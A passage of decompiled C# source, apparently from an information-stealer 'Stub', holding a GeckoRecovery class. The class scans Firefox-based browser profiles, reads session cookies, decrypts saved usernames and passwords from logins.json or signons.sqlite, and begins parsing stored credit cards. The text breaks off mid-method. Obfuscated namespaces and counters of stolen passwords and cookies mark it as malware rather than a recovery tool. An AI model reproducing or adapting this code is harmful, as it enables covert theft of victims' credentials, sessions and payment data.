using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq.Expressions;
using System.Runtime.CompilerServices;
using System.Text;
using System.Web.Script.Serialization;
using dg3ypDAonQcOidMs0w;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200004A RID: 74
	internal sealed class GeckoRecovery
	{
		// Token: 0x06000166 RID: 358 RVA: 0x000111D4 File Offset: 0x0000F3D4
		public static DataExtractionStructs.GeckoBrowser[] GetAllInfo(DataExtractionStructs.GeckoBrowserOptions options)
		{
			List<DataExtractionStructs.GeckoBrowser> list = new List<DataExtractionStructs.GeckoBrowser>();
			bool flag = (options & DataExtractionStructs.GeckoBrowserOptions.Logins) == DataExtractionStructs.GeckoBrowserOptions.Logins;
			bool flag2 = (options & DataExtractionStructs.GeckoBrowserOptions.Cookies) == DataExtractionStructs.GeckoBrowserOptions.Cookies;
			bool flag3 = (options & DataExtractionStructs.GeckoBrowserOptions.CreditCards) == DataExtractionStructs.GeckoBrowserOptions.CreditCards;
			DataExtractionStructs.GeckoBrowser[] array;
			if (!flag && !flag2 && !flag3)
			{
				array = new DataExtractionStructs.GeckoBrowser[0];
			}
			else
			{
				foreach (KeyValuePair<string, string> keyValuePair in Paths.GeckoBrowsers)
				{
					List<DataExtractionStructs.GeckoProfile> list2 = new List<DataExtractionStructs.GeckoProfile>();
					string key = keyValuePair.Key;
					string value = keyValuePair.Value;
					if (Directory.Exists(value))
					{
						foreach (string text in Directory.GetDirectories(value))
						{
							string name = new DirectoryInfo(text).Name;
							DataExtractionStructs.GeckoLogin[] array2 = null;
							DataExtractionStructs.GeckoCookie[] array3 = null;
							DataExtractionStructs.GeckoCreditCard[] array4 = null;
							if (flag)
							{
								array2 = GeckoRecovery.GetLogins(text);
							}
							if (flag2)
							{
								array3 = GeckoRecovery.GetCookies(text);
							}
							if (flag3)
							{
								array4 = GeckoRecovery.GetCreditCards(text);
							}
							if (array2 != null || array3 != null || array4 != null)
							{
								list2.Add(new DataExtractionStructs.GeckoProfile(array2, array3, array4, name));
							}
						}
						list.Add(new DataExtractionStructs.GeckoBrowser(list2.ToArray(), key));
					}
				}
				array = list.ToArray();
			}
			return array;
		}

		// Token: 0x06000167 RID: 359 RVA: 0x0001132C File Offset: 0x0000F52C
		public static DataExtractionStructs.GeckoCookie[] GetCookies(string profilePath)
		{
			List<DataExtractionStructs.GeckoCookie> list = new List<DataExtractionStructs.GeckoCookie>();
			string text = Path.Combine(profilePath, "cookies.sqlite");
			DataExtractionStructs.GeckoCookie[] array;
			if (!File.Exists(text))
			{
				array = null;
			}
			else
			{
				byte[] array2 = Utils.ForceReadFile(text, false);
				if (array2 == null)
				{
					array = null;
				}
				else
				{
					SqlLite3Parser sqlLite3Parser;
					try
					{
						sqlLite3Parser = new SqlLite3Parser(array2);
					}
					catch
					{
						return null;
					}
					if (!sqlLite3Parser.ReadTable("moz_cookies"))
					{
						array = null;
					}
					else
					{
						for (int i = 0; i < sqlLite3Parser.GetRowCount(); i++)
						{
							try
							{
								string value = sqlLite3Parser.GetValue<string>(i, "host");
								string value2 = sqlLite3Parser.GetValue<string>(i, "name");
								string value3 = sqlLite3Parser.GetValue<string>(i, "value");
								string value4 = sqlLite3Parser.GetValue<string>(i, "path");
								int num = sqlLite3Parser.GetValue<int>(i, "expiry");
								bool flag = sqlLite3Parser.GetValue<int>(i, "isSecure") == 1;
								bool flag2 = sqlLite3Parser.GetValue<int>(i, "isHttpOnly") == 1;
								if (value != null && value2 != null && value3 != null && value4 != null)
								{
									if (num == 0)
									{
										num = int.MaxValue;
									}
									list.Add(new DataExtractionStructs.GeckoCookie(value, value4, value2, value3, num, flag, flag2));
									Counter.Cookies++;
								}
							}
							catch
							{
							}
						}
						array = list.ToArray();
					}
				}
			}
			return array;
		}

		// Token: 0x06000168 RID: 360 RVA: 0x000114A4 File Offset: 0x0000F6A4
		public static DataExtractionStructs.GeckoLogin[] GetLogins(string profilePath)
		{
			GeckoDecrypto geckoDecrypto = new GeckoDecrypto(profilePath);
			DataExtractionStructs.GeckoLogin[] array;
			if (!geckoDecrypto.operational)
			{
				array = null;
			}
			else
			{
				List<DataExtractionStructs.GeckoLogin> list = new List<DataExtractionStructs.GeckoLogin>();
				string text = Path.Combine(profilePath, "signons.sqlite");
				string text2 = Path.Combine(profilePath, "logins.json");
				if (File.Exists(text) && new FileInfo(text).Length > 100L)
				{
					byte[] array2 = Utils.ForceReadFile(text, false);
					if (array2 == null)
					{
						return null;
					}
					SqlLite3Parser sqlLite3Parser;
					try
					{
						sqlLite3Parser = new SqlLite3Parser(array2);
					}
					catch
					{
						return null;
					}
					if (!sqlLite3Parser.ReadTable("moz_logins"))
					{
						return null;
					}
					for (int i = 0; i < sqlLite3Parser.GetRowCount(); i++)
					{
						try
						{
							string value = sqlLite3Parser.GetValue<string>(i, "hostname");
							string value2 = sqlLite3Parser.GetValue<string>(i, "encryptedUsername");
							string value3 = sqlLite3Parser.GetValue<string>(i, "encryptedPassword");
							if (value != null && value2 != null && value3 != null)
							{
								string text3 = geckoDecrypto.DecryptBase64(value2);
								string text4 = geckoDecrypto.DecryptBase64(value3);
								if (value != null && text3 != null && text4 != null)
								{
									list.Add(new DataExtractionStructs.GeckoLogin(text3, text4, value));
								}
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					if (!File.Exists(text2))
					{
						return null;
					}
					string text5 = Utils.ForceReadFileString(text2, false);
					if (text5 == null)
					{
						return null;
					}
					object obj;
					try
					{
						JavaScriptSerializer javaScriptSerializer = new JavaScriptSerializer();
						obj = javaScriptSerializer.Deserialize<object>(text5);
					}
					catch
					{
						return null;
					}
					if (GeckoRecovery.<>o__2.<>p__4 == null)
					{
						GeckoRecovery.<>o__2.<>p__4 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
					}
					Func<CallSite, object, bool> target = GeckoRecovery.<>o__2.<>p__4.Target;
					CallSite <>p__ = GeckoRecovery.<>o__2.<>p__4;
					if (GeckoRecovery.<>o__2.<>p__0 == null)
					{
						GeckoRecovery.<>o__2.<>p__0 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(GeckoRecovery), new CSharpArgumentInfo[]
						{
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
						}));
					}
					object obj2 = GeckoRecovery.<>o__2.<>p__0.Target(GeckoRecovery.<>o__2.<>p__0, obj, null);
					if (GeckoRecovery.<>o__2.<>p__3 == null)
					{
						GeckoRecovery.<>o__2.<>p__3 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsFalse, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
					}
					object obj4;
					if (!GeckoRecovery.<>o__2.<>p__3.Target(GeckoRecovery.<>o__2.<>p__3, obj2))
					{
						if (GeckoRecovery.<>o__2.<>p__2 == null)
						{
							GeckoRecovery.<>o__2.<>p__2 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.BinaryOperationLogical, ExpressionType.And, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
							}));
						}
						Func<CallSite, object, object, object> target2 = GeckoRecovery.<>o__2.<>p__2.Target;
						CallSite <>p__2 = GeckoRecovery.<>o__2.<>p__2;
						object obj3 = obj2;
						if (GeckoRecovery.<>o__2.<>p__1 == null)
						{
							GeckoRecovery.<>o__2.<>p__1 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "ContainsKey", null, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						obj4 = target2(<>p__2, obj3, GeckoRecovery.<>o__2.<>p__1.Target(GeckoRecovery.<>o__2.<>p__1, obj, "logins"));
					}
					else
					{
						obj4 = obj2;
					}
					if (!target(<>p__, obj4))
					{
						return null;
					}
					if (GeckoRecovery.<>o__2.<>p__6 == null)
					{
						GeckoRecovery.<>o__2.<>p__6 = CallSite<Func<CallSite, object, object[]>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(object[]), typeof(GeckoRecovery)));
					}
					Func<CallSite, object, object[]> target3 = GeckoRecovery.<>o__2.<>p__6.Target;
					CallSite <>p__3 = GeckoRecovery.<>o__2.<>p__6;
					if (GeckoRecovery.<>o__2.<>p__5 == null)
					{
						GeckoRecovery.<>o__2.<>p__5 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(GeckoRecovery), new CSharpArgumentInfo[]
						{
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
						}));
					}
					object[] array3 = target3(<>p__3, GeckoRecovery.<>o__2.<>p__5.Target(GeckoRecovery.<>o__2.<>p__5, obj, "logins"));
					foreach (object obj5 in array3)
					{
						if (GeckoRecovery.<>o__2.<>p__21 == null)
						{
							GeckoRecovery.<>o__2.<>p__21 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, bool> target4 = GeckoRecovery.<>o__2.<>p__21.Target;
						CallSite <>p__4 = GeckoRecovery.<>o__2.<>p__21;
						if (GeckoRecovery.<>o__2.<>p__7 == null)
						{
							GeckoRecovery.<>o__2.<>p__7 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						object obj6 = GeckoRecovery.<>o__2.<>p__7.Target(GeckoRecovery.<>o__2.<>p__7, obj5, null);
						if (GeckoRecovery.<>o__2.<>p__11 == null)
						{
							GeckoRecovery.<>o__2.<>p__11 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsFalse, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						object obj8;
						if (!GeckoRecovery.<>o__2.<>p__11.Target(GeckoRecovery.<>o__2.<>p__11, obj6))
						{
							if (GeckoRecovery.<>o__2.<>p__10 == null)
							{
								GeckoRecovery.<>o__2.<>p__10 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.BinaryOperationLogical, ExpressionType.And, typeof(GeckoRecovery), new CSharpArgumentInfo[]
								{
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
								}));
							}
							Func<CallSite, object, object, object> target5 = GeckoRecovery.<>o__2.<>p__10.Target;
							CallSite <>p__5 = GeckoRecovery.<>o__2.<>p__10;
							object obj7 = obj6;
							if (GeckoRecovery.<>o__2.<>p__9 == null)
							{
								GeckoRecovery.<>o__2.<>p__9 = CallSite<Func<CallSite, object, Type, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.Equal, typeof(GeckoRecovery), new CSharpArgumentInfo[]
								{
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
								}));
							}
							Func<CallSite, object, Type, object> target6 = GeckoRecovery.<>o__2.<>p__9.Target;
							CallSite <>p__6 = GeckoRecovery.<>o__2.<>p__9;
							if (GeckoRecovery.<>o__2.<>p__8 == null)
							{
								GeckoRecovery.<>o__2.<>p__8 = CallSite<Func<CallSite, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetType", null, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
							}
							obj8 = target5(<>p__5, obj7, target6(<>p__6, GeckoRecovery.<>o__2.<>p__8.Target(GeckoRecovery.<>o__2.<>p__8, obj5), typeof(Dictionary<string, object>)));
						}
						else
						{
							obj8 = obj6;
						}
						object obj9 = obj8;
						if (GeckoRecovery.<>o__2.<>p__14 == null)
						{
							GeckoRecovery.<>o__2.<>p__14 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsFalse, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						object obj11;
						if (!GeckoRecovery.<>o__2.<>p__14.Target(GeckoRecovery.<>o__2.<>p__14, obj9))
						{
							if (GeckoRecovery.<>o__2.<>p__13 == null)
							{
								GeckoRecovery.<>o__2.<>p__13 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.BinaryOperationLogical, ExpressionType.And, typeof(GeckoRecovery), new CSharpArgumentInfo[]
								{
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
								}));
							}
							Func<CallSite, object, object, object> target7 = GeckoRecovery.<>o__2.<>p__13.Target;
							CallSite <>p__7 = GeckoRecovery.<>o__2.<>p__13;
							object obj10 = obj9;
							if (GeckoRecovery.<>o__2.<>p__12 == null)
							{
								GeckoRecovery.<>o__2.<>p__12 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "ContainsKey", null, typeof(GeckoRecovery), new CSharpArgumentInfo[]
								{
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
								}));
							}
							obj11 = target7(<>p__7, obj10, GeckoRecovery.<>o__2.<>p__12.Target(GeckoRecovery.<>o__2.<>p__12, obj5, "hostname"));
						}
						else
						{
							obj11 = obj9;
						}
						object obj12 = obj11;
						if (GeckoRecovery.<>o__2.<>p__17 == null)
						{
							GeckoRecovery.<>o__2.<>p__17 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsFalse, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						object obj14;
						if (!GeckoRecovery.<>o__2.<>p__17.Target(GeckoRecovery.<>o__2.<>p__17, obj12))
						{
							if (GeckoRecovery.<>o__2.<>p__16 == null)
							{
								GeckoRecovery.<>o__2.<>p__16 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.BinaryOperationLogical, ExpressionType.And, typeof(GeckoRecovery), new CSharpArgumentInfo[]
								{
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
								}));
							}
							Func<CallSite, object, object, object> target8 = GeckoRecovery.<>o__2.<>p__16.Target;
							CallSite <>p__8 = GeckoRecovery.<>o__2.<>p__16;
							object obj13 = obj12;
							if (GeckoRecovery.<>o__2.<>p__15 == null)
							{
								GeckoRecovery.<>o__2.<>p__15 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "ContainsKey", null, typeof(GeckoRecovery), new CSharpArgumentInfo[]
								{
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
								}));
							}
							obj14 = target8(<>p__8, obj13, GeckoRecovery.<>o__2.<>p__15.Target(GeckoRecovery.<>o__2.<>p__15, obj5, "encryptedUsername"));
						}
						else
						{
							obj14 = obj12;
						}
						obj2 = obj14;
						if (GeckoRecovery.<>o__2.<>p__20 == null)
						{
							GeckoRecovery.<>o__2.<>p__20 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsFalse, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						object obj16;
						if (!GeckoRecovery.<>o__2.<>p__20.Target(GeckoRecovery.<>o__2.<>p__20, obj2))
						{
							if (GeckoRecovery.<>o__2.<>p__19 == null)
							{
								GeckoRecovery.<>o__2.<>p__19 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.BinaryOperationLogical, ExpressionType.And, typeof(GeckoRecovery), new CSharpArgumentInfo[]
								{
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
								}));
							}
							Func<CallSite, object, object, object> target9 = GeckoRecovery.<>o__2.<>p__19.Target;
							CallSite <>p__9 = GeckoRecovery.<>o__2.<>p__19;
							object obj15 = obj2;
							if (GeckoRecovery.<>o__2.<>p__18 == null)
							{
								GeckoRecovery.<>o__2.<>p__18 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "ContainsKey", null, typeof(GeckoRecovery), new CSharpArgumentInfo[]
								{
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
									CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
								}));
							}
							obj16 = target9(<>p__9, obj15, GeckoRecovery.<>o__2.<>p__18.Target(GeckoRecovery.<>o__2.<>p__18, obj5, "encryptedPassword"));
						}
						else
						{
							obj16 = obj2;
						}
						if (target4(<>p__4, obj16))
						{
							try
							{
								if (GeckoRecovery.<>o__2.<>p__23 == null)
								{
									GeckoRecovery.<>o__2.<>p__23 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(GeckoRecovery)));
								}
								Func<CallSite, object, string> target10 = GeckoRecovery.<>o__2.<>p__23.Target;
								CallSite <>p__10 = GeckoRecovery.<>o__2.<>p__23;
								if (GeckoRecovery.<>o__2.<>p__22 == null)
								{
									GeckoRecovery.<>o__2.<>p__22 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(GeckoRecovery), new CSharpArgumentInfo[]
									{
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
									}));
								}
								string text6 = target10(<>p__10, GeckoRecovery.<>o__2.<>p__22.Target(GeckoRecovery.<>o__2.<>p__22, obj5, "hostname"));
								if (GeckoRecovery.<>o__2.<>p__25 == null)
								{
									GeckoRecovery.<>o__2.<>p__25 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(GeckoRecovery)));
								}
								Func<CallSite, object, string> target11 = GeckoRecovery.<>o__2.<>p__25.Target;
								CallSite <>p__11 = GeckoRecovery.<>o__2.<>p__25;
								if (GeckoRecovery.<>o__2.<>p__24 == null)
								{
									GeckoRecovery.<>o__2.<>p__24 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(GeckoRecovery), new CSharpArgumentInfo[]
									{
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
									}));
								}
								string text7 = target11(<>p__11, GeckoRecovery.<>o__2.<>p__24.Target(GeckoRecovery.<>o__2.<>p__24, obj5, "encryptedUsername"));
								if (GeckoRecovery.<>o__2.<>p__27 == null)
								{
									GeckoRecovery.<>o__2.<>p__27 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(GeckoRecovery)));
								}
								Func<CallSite, object, string> target12 = GeckoRecovery.<>o__2.<>p__27.Target;
								CallSite <>p__12 = GeckoRecovery.<>o__2.<>p__27;
								if (GeckoRecovery.<>o__2.<>p__26 == null)
								{
									GeckoRecovery.<>o__2.<>p__26 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(GeckoRecovery), new CSharpArgumentInfo[]
									{
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
									}));
								}
								string text8 = target12(<>p__12, GeckoRecovery.<>o__2.<>p__26.Target(GeckoRecovery.<>o__2.<>p__26, obj5, "encryptedPassword"));
								string text9 = geckoDecrypto.DecryptBase64(text7);
								string text10 = geckoDecrypto.DecryptBase64(text8);
								if (text6 != null && text9 != null && text10 != null)
								{
									list.Add(new DataExtractionStructs.GeckoLogin(text9, text10, text6));
									Counter.Passwords++;
								}
							}
							catch
							{
							}
						}
					}
				}
				array = list.ToArray();
			}
			return array;
		}

		// Token: 0x06000169 RID: 361 RVA: 0x00012014 File Offset: 0x00010214
		public static DataExtractionStructs.GeckoCreditCard[] GetCreditCards(string profilePath)
		{
			List<DataExtractionStructs.GeckoCreditCard> list = new List<DataExtractionStructs.GeckoCreditCard>();
			string text = Path.Combine(profilePath, "autofill-profiles.json");
			DataExtractionStructs.GeckoCreditCard[] array;
			if (!File.Exists(text))
			{
				array = null;
			}
			else
			{
				string text2 = Utils.ForceReadFileString(text, false);
				if (text2 == null)
				{
					array = null;
				}
				else
				{
					object obj;
					try
					{
						JavaScriptSerializer javaScriptSerializer = new JavaScriptSerializer();
						obj = javaScriptSerializer.Deserialize<object>(text2);
					}
					catch
					{
						return null;
					}
					if (GeckoRecovery.<>o__3.<>p__0 == null)
					{
						GeckoRecovery.<>o__3.<>p__0 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.Equal, typeof(GeckoRecovery), new CSharpArgumentInfo[]
						{
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
							CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
						}));
					}
					object obj2 = GeckoRecovery.<>o__3.<>p__0.Target(GeckoRecovery.<>o__3.<>p__0, obj, null);
					if (GeckoRecovery.<>o__3.<>p__4 == null)
					{
						GeckoRecovery.<>o__3.<>p__4 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
					}
					object obj4;
					if (!GeckoRecovery.<>o__3.<>p__4.Target(GeckoRecovery.<>o__3.<>p__4, obj2))
					{
						if (GeckoRecovery.<>o__3.<>p__3 == null)
						{
							GeckoRecovery.<>o__3.<>p__3 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.BinaryOperationLogical, ExpressionType.Or, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
							}));
						}
						Func<CallSite, object, object, object> target = GeckoRecovery.<>o__3.<>p__3.Target;
						CallSite <>p__ = GeckoRecovery.<>o__3.<>p__3;
						object obj3 = obj2;
						if (GeckoRecovery.<>o__3.<>p__2 == null)
						{
							GeckoRecovery.<>o__3.<>p__2 = CallSite<Func<CallSite, object, Type, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
							}));
						}
						Func<CallSite, object, Type, object> target2 = GeckoRecovery.<>o__3.<>p__2.Target;
						CallSite <>p__2 = GeckoRecovery.<>o__3.<>p__2;
						if (GeckoRecovery.<>o__3.<>p__1 == null)
						{
							GeckoRecovery.<>o__3.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetType", null, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						obj4 = target(<>p__, obj3, target2(<>p__2, GeckoRecovery.<>o__3.<>p__1.Target(GeckoRecovery.<>o__3.<>p__1, obj), typeof(Dictionary<string, object>)));
					}
					else
					{
						obj4 = obj2;
					}
					object obj5 = obj4;
					if (GeckoRecovery.<>o__3.<>p__9 == null)
					{
						GeckoRecovery.<>o__3.<>p__9 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
					}
					bool flag;
					if (!GeckoRecovery.<>o__3.<>p__9.Target(GeckoRecovery.<>o__3.<>p__9, obj5))
					{
						if (GeckoRecovery.<>o__3.<>p__8 == null)
						{
							GeckoRecovery.<>o__3.<>p__8 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, bool> target3 = GeckoRecovery.<>o__3.<>p__8.Target;
						CallSite <>p__3 = GeckoRecovery.<>o__3.<>p__8;
						if (GeckoRecovery.<>o__3.<>p__7 == null)
						{
							GeckoRecovery.<>o__3.<>p__7 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.BinaryOperationLogical, ExpressionType.Or, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
							}));
						}
						Func<CallSite, object, object, object> target4 = GeckoRecovery.<>o__3.<>p__7.Target;
						CallSite <>p__4 = GeckoRecovery.<>o__3.<>p__7;
						object obj6 = obj5;
						if (GeckoRecovery.<>o__3.<>p__6 == null)
						{
							GeckoRecovery.<>o__3.<>p__6 = CallSite<Func<CallSite, object, object>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.Not, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, object> target5 = GeckoRecovery.<>o__3.<>p__6.Target;
						CallSite <>p__5 = GeckoRecovery.<>o__3.<>p__6;
						if (GeckoRecovery.<>o__3.<>p__5 == null)
						{
							GeckoRecovery.<>o__3.<>p__5 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "ContainsKey", null, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						flag = target3(<>p__3, target4(<>p__4, obj6, target5(<>p__5, GeckoRecovery.<>o__3.<>p__5.Target(GeckoRecovery.<>o__3.<>p__5, obj, "creditCards"))));
					}
					else
					{
						flag = true;
					}
					if (flag)
					{
						array = null;
					}
					else
					{
						if (GeckoRecovery.<>o__3.<>p__10 == null)
						{
							GeckoRecovery.<>o__3.<>p__10 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(GeckoRecovery), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						obj = GeckoRecovery.<>o__3.<>p__10.Target(GeckoRecovery.<>o__3.<>p__10, obj, "creditCards");
						if (GeckoRecovery.<>o__3.<>p__13 == null)
						{
							GeckoRecovery.<>o__3.<>p__13 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(GeckoRecovery), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, bool> target6 = GeckoRecovery.<>o__3.<>p__13.Target;
